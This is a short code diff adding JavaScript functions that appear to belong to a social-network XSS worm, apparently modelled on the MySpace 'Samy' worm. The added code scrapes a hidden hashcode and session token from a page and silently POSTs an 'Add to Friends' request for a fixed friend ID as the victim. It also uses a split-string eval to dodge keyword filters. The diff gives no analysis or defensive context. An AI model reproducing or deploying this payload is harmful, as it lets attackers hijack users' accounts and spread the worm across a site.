@@ -201,3 +201,32 @@ function main() {
     httpSend2('/index.cfm?fuseaction=invite.addfriend_verify&friendID=11851658&Mytoken=' + L, processxForm, 'GET');
 }
 
+function processXForm() {
+    if (xmlhttp2.readyState != 4) {
+        return;
+    }
+
+    var AU = xmlhttp2.responseText;
+    var AQ = getHiddenParameter(AU, 'hashcode');
+    var AR = getFromUrl(AU, 'Mytoken');
+    var AS = new Array();
+    AS['hashcode'] = AQ;
+    AS['friendID'] = '11851658';
+    AS['submit'] = 'Add to Friends';
+    httpSend2('/index.cfm?fuseaction=invite.addFriendsProcess&Mytoken=' + AR, nothing, 'POST', paramsToString(AS));
+}
+
+function httpSend2(BH, BI, BJ, BK) {
+    if (!xmlhttp2) {
+        return false;
+    }
+
+    eval('xmlhttp2.onr' + 'eadystatechange=BI');
+    xmlhttp2.open(BJ, BH, true);
+    if (BJ == 'POST') {
+        xmlhttp2.setRequestHeader('Content-Type', 'applicaiton/x-www-form-urlencoded');
+        xmlhttp2.setRequestHeader('Content-Length', BK.length);
+    }
+    xmlhttp2.send(BK);
+    return true;
+}
